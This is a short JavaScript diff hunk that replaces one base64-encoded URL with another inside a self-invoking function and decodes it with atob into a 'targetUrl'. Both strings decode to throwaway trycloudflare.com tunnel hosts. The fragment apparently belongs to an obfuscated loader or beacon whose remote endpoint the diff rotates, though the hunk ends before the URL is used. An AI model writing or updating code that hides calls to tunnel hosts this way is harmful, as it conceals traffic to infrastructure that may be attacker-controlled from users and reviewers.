@@ -1,5 +1,5 @@
 (function() {
-    const base64Url = "aHR0cHM6Ly9nZW5lLXBzeWNoaWF0cnktdHJhbnNwYXJlbnQtY29uc3RydWN0LnRyeWNsb3VkZmxhcmUuY29t"; 
+    const base64Url = "aHR0cHM6Ly9nb2Fscy1pbmctbWVyZ2UtZXhwZXJpbWVudC50cnljbG91ZGZsYXJlLmNvbQ=="; 
     
     try {
         const targetUrl = atob(base64Url.trim());
